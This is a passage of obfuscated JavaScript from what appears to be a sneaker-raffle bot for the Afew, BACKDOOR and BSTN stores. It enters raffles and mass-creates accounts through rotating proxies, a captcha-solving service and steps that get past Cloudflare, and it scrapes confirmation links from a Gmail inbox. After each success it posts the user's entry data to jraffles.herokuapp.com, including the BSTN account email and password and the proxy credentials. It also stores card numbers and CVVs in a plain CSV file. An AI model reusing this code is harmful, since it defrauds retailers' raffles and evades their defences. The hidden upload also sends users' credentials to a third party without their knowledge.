                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x146e8e[0x0] + ':' + _0x146e8e[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x37ba17 = JSON['parse'](_0x534d99['readFileSync']('sizes.json', 'utf-8')), _0x492957 = _0x31ae25[_0x2435c1]['Url'], _0x57fb1e = _0x31ae25[_0x2435c1]['Size'], _0x5d026a;
                        async function _0x189219() {
                            var _0x3259a4 = new _0x29b6e6['CookieJar']();
                            console['log'](_0x1a8584() + '\x20[' + _0xf858b2['name'] + ']\x20Task\x20' + (_0x2435c1 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x5711bb;
                            let _0x4916d9 = {
                                'method': 'GET',
                                'cookieJar': _0x3259a4,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x146e8e[0x2] + ':' + _0x146e8e[0x3] + '@' + _0x146e8e[0x0] + ':' + _0x146e8e[0x1]
                            }, _0x3d4a5e = _0x492957['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x454486 = _0x3d4a5e + '.json', _0x4f70d3 = await _0x8ae996(_0x454486);
                            console['log'](_0x1a8584() + '\x20[' + _0xf858b2['name'] + ']\x20Task\x20' + (_0x2435c1 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x178c64 = _0x4f70d3['data']['product']['variants'];
                            if (_0x57fb1e != 'RANDOM') {
                                if (_0x178c64[0x1]['option1']['includes']('W')) {
                                    const _0x1dc45b = _0x37ba17['women']['find'](_0x5db8de => _0x5db8de['EUsize'] === _0x57fb1e);
                                    _0x1dc45b && (_0x57fb1e = _0x1dc45b['size']);
                                } else {
                                    if (_0x178c64[0x1]['option1']['includes']('Y')) {
                                        const _0x537c44 = _0x37ba17['men']['find'](_0x5929e7 => _0x5929e7['EUsize'] === _0x57fb1e);
                                        _0x537c44 && (_0x57fb1e = _0x537c44['size'] + 'Y');
                                    } else {
                                        const _0x54a6d2 = _0x37ba17['men']['find'](_0x394f31 => _0x394f31['EUsize'] === _0x57fb1e);
                                        _0x54a6d2 && (_0x57fb1e = _0x54a6d2['size']);
                                    }
                                }
                                for (var _0x2f8988 of _0x178c64) {
                                    _0x2f8988['option1'] == _0x57fb1e && (_0x5711bb = _0x2f8988['id']);
                                }
                            } else {
                                var _0x39b34e = Math['round'](Math['random']() * (_0x178c64['length'] - 0x1));
                                _0x5711bb = _0x178c64[_0x39b34e]['id'];
                            }
                            console['log'](_0x1a8584() + '\x20[' + _0xf858b2['name'] + ']\x20Task\x20' + (_0x2435c1 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x8ae996('https://raffles.afew-store.com/cart/' + _0x5711bb + ':1'), _0x5d026a = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x189219();
                        } catch (_0x180db9) {
                            if (_0x180db9['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x180db9);
                        }
                        const _0xcef88d = await _0x1082ff['newPage']();
                        await _0xcef88d['setDefaultNavigationTimeout'](0x1d4c0), await _0xcef88d['authenticate']({
                            'username': '' + _0x146e8e[0x2],
                            'password': '' + _0x146e8e[0x3]
                        }), await _0xcef88d['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xcef88d['setRequestInterception'](!![]), _0xcef88d['on']('request', _0xb3d19a => {
                            _0xb3d19a['resourceType']() === 'image' || _0xb3d19a['resourceType']() === 'font' || _0xb3d19a['resourceType']() === 'media' ? _0xb3d19a['abort']() : _0xb3d19a['continue']();
                        });
                        try {
                            await _0xcef88d['goto'](_0x5d026a, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x1a8584() + '\x20[' + _0xf858b2['name'] + ']\x20Task\x20' + (_0x2435c1 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0xcef88d['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xcef88d['type']('#checkout_email', '' + _0x31ae25[_0x2435c1]['Email']), await _0x1e21d2(0x320), await _0xcef88d['type']('#checkout_attributes_instagram', '' + _0x31ae25[_0x2435c1]['Follower']), await _0x1e21d2(0x320), await _0xcef88d['select']('#checkout_shipping_address_country', '' + _0x31ae25[_0x2435c1]['Country']), await _0xcef88d['waitForTimeout'](0x258), await _0xcef88d['type']('#checkout_shipping_address_first_name', '' + _0x31ae25[_0x2435c1]['FirstName']), await _0xcef88d['waitForTimeout'](0x320), await _0xcef88d['type']('#checkout_shipping_address_last_name', '' + _0x31ae25[_0x2435c1]['LastName']), await _0xcef88d['waitForTimeout'](0x2bc), await _0xcef88d['type']('#checkout_shipping_address_address1', _0x31ae25[_0x2435c1]['Address1'] + '\x20' + _0x31ae25[_0x2435c1]['HouseNumber']), await _0xcef88d['waitForTimeout'](0x2bc), await _0xcef88d['type']('#checkout_shipping_address_address2', '' + _0x31ae25[_0x2435c1]['Address2']), await _0xcef88d['waitForTimeout'](0x2bc), await _0xcef88d['type']('#checkout_shipping_address_zip', '' + _0x31ae25[_0x2435c1]['Zip']), await _0xcef88d['waitForTimeout'](0x2bc), await _0xcef88d['type']('#checkout_shipping_address_city', '' + _0x31ae25[_0x2435c1]['City']), await _0xcef88d['waitForTimeout'](0x2bc);
                        if (_0x31ae25[_0x2435c1]['State'] != '')
                            try {
                                const _0x44a31f = JSON['parse'](_0x534d99['readFileSync']('States.json', 'utf8'));
                                await _0x1e21d2(0x1f4);
                                if (_0x31ae25[_0x2435c1]['State']['length'] > 0x2)
                                    for (let _0x1dd3cf of _0x44a31f) {
                                        if (_0x1dd3cf['Province'] == _0x31ae25[_0x2435c1]['State']) {
                                            await _0xcef88d['select']('#checkout_shipping_address_province', _0x1dd3cf['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0xcef88d['select']('#checkout_shipping_address_province', _0x31ae25[_0x2435c1]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x1e21d2(0x1f4), console['log'](_0x1a8584() + '\x20[' + _0xf858b2['name'] + ']\x20Task\x20' + (_0x2435c1 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x1e21d2(0x190), _0xcef88d['evaluate'](() => {
                            const _0x2b369a = document['querySelector']('#continue_button');
                            for (var _0x3e7279 = 0x0; _0x3e7279 < 0x5; _0x3e7279++) {
                                if (_0x2b369a) {
                                    _0x2b369a['click'](), _0x2b369a['click']();
                                    break;
                                } else
                                    _0x1e21d2(0xfa0);
                            }
                        }), await _0xcef88d['waitForTimeout'](0x9c4);
                        try {
                            await _0xcef88d['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0xcef88d['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x56de91 => _0x56de91['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xcef88d['waitForTimeout'](0x7d0), console['log'](_0x1a8584() + '\x20[' + _0xf858b2['name'] + ']\x20Task\x20' + (_0x2435c1 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0xcef88d['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x1e21d2(0x3e8), await _0xcef88d['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x359d61 => _0x359d61['submit']()), await _0x1e21d2(0x3e8);
                        try {
                            await _0xcef88d['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xcef88d['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x1e8113 => _0x1e8113['submit']());
                        try {
                            await _0xcef88d['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x52a7e2 = 'no', _0x406375(_0x31ae25[_0x2435c1], _0xf858b2), console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0xf858b2['name'] + ']\x20Task\x20' + (_0x2435c1 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '')
                                try {
                                    await _0xa0452b(_0x4558f2['webhook'], _0x44009c['succesDEVMSG']);
                                } catch {
                                }
                            await _0x1e21d2(0xc8), await _0xa0452b(_0x258e47, _0x44009c['succesDEVMSG']), await _0x1e21d2(0xc8);
                            try {
                                await _0xa0452b(_0x28ff05, _0x44009c['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0xf4f7bc['replace']('#', ''),
                                    'module': _0xf858b2['name'],
                                    'entrydata': JSON['stringify'](_0x3a484a),
                                    'proxy': '' + _0x325060[_0x2435c1]
                                };
                                var _0x30ad22 = JSON['stringify'](prxdata);
                                let _0x1a2631 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x8ae996['post']('https://jraffles.herokuapp.com/success', _0x30ad22, _0x1a2631);
                            } catch (_0x258129) {
                            }
                        } catch (_0x439acf) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x2e472e) {
                        _0x2e472e['message']['includes']('selector') && (_0x2e472e = 'Connection\x20Error');
                        console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0xf858b2['name'] + ']\x20Task\x20' + (_0x2435c1 + 0x1) + '\x20:\x20' + _0x2e472e)), _0x321ed2 = '' + _0x2e472e;
                        var _0xe78080 = await _0x3d56af(_0x31ae25[_0x2435c1], _0xf858b2, 'dev', !![], _0x321ed2);
                        _0x44009c['errorDEV'] = { 'embeds': [_0xe78080] }, _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x44009c['errorDEV']), await _0xa0452b(_0x5522d1, _0x44009c['errorDEV']), _0x52a7e2 = 'yes';
                    } finally {
                        _0x1082ff && _0x1082ff['close']();
                        if (_0x52a7e2 == 'yes' && _0x1b2aec != 0x5 && _0x321ed2 != 'Size\x20Not\x20Found') {
                            console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0xf858b2['name'] + ']\x20Task\x20' + (_0x2435c1 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1b2aec + '\x20/\x205)')), _0x2435c1 = _0x2435c1 - 0x1, _0x1b2aec = _0x1b2aec + 0x1;
                            continue;
                        }
                        _0x52a7e2 == 'yes' && _0x1b2aec >= 0x5 && (_0x456859(_0x31ae25[_0x2435c1], _0xf858b2), _0x52a7e2 = 'no', _0x1b2aec = 0x0);
                        if (_0x2435c1 + 0x1 == _0x31ae25['length']) {
                            await _0x1e21d2(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x4558f2['AfewDelay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BACKDOOR\x20Botega',
        'modules': [{
            'name': 'BACKDOOR\x20Raffle\x20Entries',
            'logo': 'https://backdoor-media.s3.eu-central-1.amazonaws.com/wp-content/uploads/2021/10/10002342/logo-backdoor-bottega.png',
            'store': 'BACKDOOR',
            'function': async function (_0x190a75, _0x22b1bb, _0x41db05) {
                console['clear'](), console['log']('Preparing\x20BACKDOOR\x20Tasks\x20&\x20Launching\x20new\x20window..'), _0x534d99['writeFileSync']('proxies.txt', '');
                for (proxy in _0x41db05) {
                    _0x534d99['appendFileSync']('proxies.txt', _0x41db05[proxy] + '\x0a');
                }
                for (var _0x14d6fd = 0x0; _0x14d6fd < _0x22b1bb['length']; _0x14d6fd++) {
                    await _0x437e8(_0x22b1bb, _0x14d6fd), _0x534d99['appendFileSync']('tasks.csv', '\x0a' + _0x22b1bb[_0x14d6fd]['Url'] + ',' + _0x22b1bb[_0x14d6fd]['Size'] + ',' + _0x22b1bb[_0x14d6fd]['Email'] + ',' + _0x22b1bb[_0x14d6fd]['Password'] + ',' + _0x22b1bb[_0x14d6fd]['FirstName'] + ',' + _0x22b1bb[_0x14d6fd]['LastName'] + ',' + _0x22b1bb[_0x14d6fd]['Address1'] + ',' + _0x22b1bb[_0x14d6fd]['Address2'] + ',' + _0x22b1bb[_0x14d6fd]['HouseNumber'] + ',' + _0x22b1bb[_0x14d6fd]['Zip'] + ',' + _0x22b1bb[_0x14d6fd]['City'] + ',' + _0x22b1bb[_0x14d6fd]['Country'] + ',' + _0x22b1bb[_0x14d6fd]['State'] + ',' + _0x22b1bb[_0x14d6fd]['CardNumber'] + ',' + _0x22b1bb[_0x14d6fd]['ExpiryDate'] + ',' + _0x22b1bb[_0x14d6fd]['CVV'] + ',' + _0x22b1bb[_0x14d6fd]['NameOnCard'] + ',' + _0x22b1bb[_0x14d6fd]['Phone'] + ',' + _0x22b1bb[_0x14d6fd]['Follower']);
                }
                let _0x554916 = {
                    'username': _0xf4f7bc,
                    'delay': _0x4558f2['delay'],
                    'version': _0x2bc61f,
                    'webhook': _0x4558f2['webhook']
                };
                const _0x126461 = JSON['stringify'](_0x554916)['replace'](/"/g, '\x5c\x22');
                await _0x1e21d2(0x3e8), _0x1aeda3('start', [
                    'cmd',
                    '/k',
                    'node\x20modules/backdoor/entry.js\x20' + _0x126461
                ], { 'shell': !![] });
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x210969, _0x1ef108, _0x4c489f) {
                    var _0x200a0c = _0x1ef108, _0x2b7c1c = 0x0;
                    for (var _0x493c18 = 0x0; _0x493c18 < _0x1ef108['length']; _0x493c18++) {
                        maxTasks = Number(_0x4558f2['threads']);
                        while (_0x2b7c1c >= maxTasks) {
                            await _0x1e21d2(_0x4558f2['delay']);
                        }
                        async function _0x1da305(_0x1df47c, _0x4c0d6d, _0x3af11a, _0x1b5ace, _0x6c5e03) {
                            _0x2b7c1c++, _0x16ed0a['use'](_0x27f782()), _0x16ed0a['use'](_0x3d4bba({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4558f2['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x3fe564;
                            try {
                                await _0x437e8(_0x4c0d6d, _0x1b5ace);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x4a5c1f(_0x1df47c['name'] + '\x20Task\x20' + (_0x1b5ace + 0x1) + '\x20/\x20' + _0x4c0d6d['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40);
                            var _0x16fd1b = await _0x3d56af(_0x4c0d6d[_0x1b5ace], _0x1df47c, 'acc', ![]);
                            const _0x4c85f7 = { 'succesDEVMSG': { 'embeds': [_0x16fd1b] } }, _0x2c2251 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x5186d7 = Math['round'](Math['random']() * (_0x3af11a['length'] - 0x1)), _0x3d3b62 = _0x3af11a[_0x5186d7]['split'](':'), _0x51a058;
                            try {
                                _0x51a058 = await _0x16ed0a['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x3d3b62[0x0] + ':' + _0x3d3b62[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x51a058 = await _0x16ed0a['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x3d3b62[0x0] + ':' + _0x3d3b62[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x11e800 = await _0x51a058['newPage']();
                                await _0x11e800['authenticate']({
                                    'username': '' + _0x3d3b62[0x2],
                                    'password': '' + _0x3d3b62[0x3]
                                }), console['log'](_0x1a8584() + '\x20[' + _0x1df47c['name'] + ']\x20Task\x20' + (_0x1b5ace + 0x1) + '\x20:\x20Getting\x20Session'), await _0x11e800['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x11e800['setRequestInterception'](!![]), _0x11e800['on']('request', _0x52a071 => {
                                    _0x52a071['resourceType']() === 'image' ? _0x52a071['abort']() : _0x52a071['continue']();
                                });
                                try {
                                    await _0x11e800['goto']('' + _0x2c2251), await _0x11e800['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x11e800['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x1a8584() + '\x20[' + _0x1df47c['name'] + ']\x20Task\x20' + (_0x1b5ace + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x1e21d2(0x7d0), console['log'](_0x1a8584() + '\x20[' + _0x1df47c['name'] + ']\x20Task\x20' + (_0x1b5ace + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x1e21d2(0x190), await _0x11e800['waitForSelector']('#firstname'), await _0x11e800['focus']('#firstname'), await _0x11e800['keyboard']['down']('Control'), await _0x11e800['keyboard']['press']('A'), await _0x1e21d2(0xc8), await _0x11e800['keyboard']['up']('Control'), await _0x11e800['keyboard']['press']('Backspace'), await _0x11e800['type']('#firstname', _0x4c0d6d[_0x1b5ace]['FirstName'], { 'delay': 0xf0 }), await _0x1e21d2(0x190), await _0x11e800['focus']('#lastname'), await _0x11e800['keyboard']['down']('Control'), await _0x11e800['keyboard']['press']('A'), await _0x1e21d2(0xc8), await _0x11e800['keyboard']['up']('Control'), await _0x11e800['keyboard']['press']('Backspace'), await _0x11e800['type']('#lastname', _0x4c0d6d[_0x1b5ace]['LastName'], { 'delay': 0xe6 }), await _0x1e21d2(0x190), await _0x11e800['focus']('#email_address'), await _0x11e800['keyboard']['down']('Control'), await _0x11e800['keyboard']['press']('A'), await _0x1e21d2(0xc8), await _0x11e800['keyboard']['up']('Control'), await _0x11e800['keyboard']['press']('Backspace'), await _0x11e800['type']('#email_address', _0x4c0d6d[_0x1b5ace]['Email'], { 'delay': 0x122 }), await _0x1e21d2(0x190), await _0x11e800['type']('#password', _0x4c0d6d[_0x1b5ace]['Password'], { 'delay': 0x82 }), await _0x1e21d2(0x1f4), await _0x11e800['type']('#password-confirmation', _0x4c0d6d[_0x1b5ace]['Password'], { 'delay': 0x7c }), console['log'](_0x1a8584() + '\x20[' + _0x1df47c['name'] + ']\x20Task\x20' + (_0x1b5ace + 0x1) + '\x20:\x20Sending\x20Request'), await _0x1e21d2(0x2bc), await _0x11e800['$eval']('#form-validate', _0xb584f => _0xb584f['submit']()), await _0x1e21d2(0x1388);
                                const _0x1e0292 = await _0x11e800['$']('#email_address-error');
                                if (_0x1e0292)
                                    throw new Error('Invalid\x20Email');
                                const _0x54e530 = await _0x11e800['$']('#password-error');
                                if (_0x54e530)
                                    throw new Error('Invalid\x20Password');
                                await _0x11e800['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x1df47c['name'] + ']\x20Task\x20' + (_0x1b5ace + 0x1) + '\x20:\x20Account\x20' + _0x4c0d6d[_0x1b5ace]['Email'] + '\x20Generated')), _0x534d99['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x4c0d6d[_0x1b5ace]['Email'] + ',' + _0x4c0d6d[_0x1b5ace]['Password']);
                                try {
                                    _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x4c85f7['succesDEVMSG']);
                                } catch {
                                }
                                await _0xa0452b(_0x46ec81, _0x4c85f7['succesDEVMSG']);
                                let _0x219840 = _0x4c0d6d[_0x1b5ace];
                                try {
                                    prxdata = {
                                        'username': _0xf4f7bc['replace']('#', ''),
                                        'module': _0x1df47c['name'],
                                        'entrydata': JSON['stringify'](_0x219840),
                                        'proxy': '' + _0x3af11a[_0x1b5ace]
                                    };
                                    var _0x5bde7f = JSON['stringify'](prxdata);
                                    let _0x21e44f = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x8ae996['post']('https://jraffles.herokuapp.com/success', _0x5bde7f, _0x21e44f);
                                } catch (_0x469cc7) {
                                }
                                console['log'](_0x31f5da['yellow'](_0x1a8584() + '\x20[' + _0x1df47c['name'] + ']\x20Task\x20' + (_0x1b5ace + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x4710b4) {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x1df47c['name'] + ']\x20Task\x20' + (_0x1b5ace + 0x1) + '\x20:\x20' + _0x4710b4)), _0x3fe564 = '' + _0x4710b4;
                                var _0x2a21e8 = await _0x3d56af(_0x4c0d6d[_0x1b5ace], _0x1df47c, 'acc', !![], _0x3fe564);
                                _0x4c85f7['errorDEV'] = { 'embeds': [_0x2a21e8] }, _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x4c85f7['errorDEV']), await _0xa0452b(_0x5522d1, _0x4c85f7['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x51a058)
                                    _0x51a058['close']();
                                if (retry == 'yes' && _0x6c5e03 < 0x5)
                                    return console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x1df47c['name'] + ']\x20Task\x20' + (_0x1b5ace + 0x1) + '\x20:\x20Retrying\x20(' + (_0x6c5e03 + 0x1) + '\x20/\x205)')), _0x2b7c1c--, _0x6c5e03 = _0x6c5e03 + 0x1, _0x1da305(_0x1df47c, _0x4c0d6d, _0x3af11a, _0x1b5ace, _0x6c5e03);
                                retry == 'yes' && _0x6c5e03 >= 0x5 && (_0x456859(_0x4c0d6d[_0x1b5ace], _0x1df47c), retry = 'no', _0x6c5e03 = 0x0), _0x2b7c1c--, console['log'](_0x1a8584() + '\x20[' + _0x1df47c['name'] + ']\x20Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                            }
                        }
                        _0x1da305(_0x210969, _0x200a0c, _0x4c489f, _0x493c18, 0x0), await _0x1e21d2(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x26e12d, _0xf7b603) {
                    var _0x1a6459 = ![], _0x236a56 = [], _0x2027d1 = 0x0;
                    async function _0x4737af() {
                        var _0x536829 = new _0x48412a({
                            'user': _0x4558f2['masterMail'],
                            'password': _0x4558f2['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x417746(_0x48b029) {
                            _0x536829['openBox']('INBOX', ![], _0x48b029);
                        }
                        _0x536829['once']('ready', function () {
                            _0x417746(function (_0x1aacdb, _0x53d317) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x1aacdb)
                                    throw _0x1aacdb;
                                _0x536829['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x10e03f, _0x1424ec) {
                                    if (!_0x1424ec || !_0x1424ec['length'])
                                        console['log'](_0x1a8584() + '\x20[' + _0x26e12d['name'] + ']\x20No\x20mails\x20found'), _0x536829['end']();
                                    else {
                                        var _0x28c90e = _0x536829['seq']['fetch'](_0x1424ec, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x28c90e['on']('message', function (_0x2cc0db, _0x5772fb) {
                                            var _0x6a7ab9 = '(#' + _0x5772fb + ')\x20';
                                            _0x2cc0db['on']('body', function (_0x59b5cc, _0x2d59da) {
                                                _0x1560b8(_0x59b5cc, (_0x471189, _0x327629) => {
                                                    var _0x559eb = _0x327629['text']['split']('customer/account/confirm/')[0x1], _0x4221f6 = _0x559eb['split'](']')[0x0], _0x15a0e9 = _0x4221f6['split']('>')[0x0];
                                                    _0x236a56['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x15a0e9);
                                                });
                                            }), _0x2cc0db['once']('end', function () {
                                            });
                                        }), _0x28c90e['once']('error', function (_0x33fdfc) {
                                            console['log']('Fetch\x20error:\x20' + _0x33fdfc), _0x1a6459 = !![];
                                        }), _0x28c90e['once']('end', function () {
                                            _0x536829['end'](), _0x1a6459 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x536829['once']('error', function (_0x183dcd) {
                            console['log'](_0x31f5da['red'](_0x183dcd['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x1a6459 = !![];
                        }), _0x536829['once']('end', async function () {
                            _0x1a6459 = !![];
                        }), _0x536829['connect']();
                    }
                    try {
                        _0x4737af();
                        while (!_0x1a6459) {
                            await _0x1e21d2(0xfa0);
                        }
                        console['log']('Found\x20' + _0x236a56['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x1e21d2(0x7d0);
                    }
                    for (var _0xe697e = 0x0; _0xe697e < _0x236a56['length']; _0xe697e++) {
                        maxTasks = Number(_0x4558f2['threads']);
                        while (_0x2027d1 >= maxTasks) {
                            await _0x1e21d2(_0x4558f2['delay']);
                        }
                        async function _0x177b87(_0xde2b0f, _0x271d55, _0x904d85, _0x160a01, _0x5acae0) {
                            _0x2027d1++, _0x16ed0a['use'](_0x27f782());
                            if (_0x3a72e9 != 'yes')
                                var _0x3a72e9 = '', _0x5acae0 = 0x0;
                            var _0x51c61f = Math['round'](Math['random']() * (_0x904d85['length'] - 0x1)), _0x184f45 = _0x904d85[_0x51c61f]['split'](':'), _0x2c2e35;
                            try {
                                _0x2c2e35 = await _0x16ed0a['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x184f45[0x0] + ':' + _0x184f45[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x2c2e35 = await _0x16ed0a['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x184f45[0x0] + ':' + _0x184f45[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x40ef0e = await _0x2c2e35['newPage']();
                                await _0x40ef0e['authenticate']({
                                    'username': '' + _0x184f45[0x2],
                                    'password': '' + _0x184f45[0x3]
                                }), console['log'](_0x1a8584() + '\x20[' + _0xde2b0f['name'] + ']\x20Task\x20' + (_0x160a01 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x40ef0e['setRequestInterception'](!![]), _0x40ef0e['on']('request', _0x3aef60 => {
                                    _0x3aef60['resourceType']() === 'image' ? _0x3aef60['abort']() : _0x3aef60['continue']();
                                }), console['log'](_0x1a8584() + '\x20[' + _0xde2b0f['name'] + ']\x20Task\x20' + (_0x160a01 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x40ef0e['goto'](_0x271d55[_0x160a01]);
                                } catch (_0x411ab1) {
                                    _0x3a72e9 = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x411ab1);
                                }
                                console['log'](_0x1a8584() + '\x20[' + _0xde2b0f['name'] + ']\x20Task\x20' + (_0x160a01 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x40ef0e['waitForTimeout'](0xbb8);
                                try {
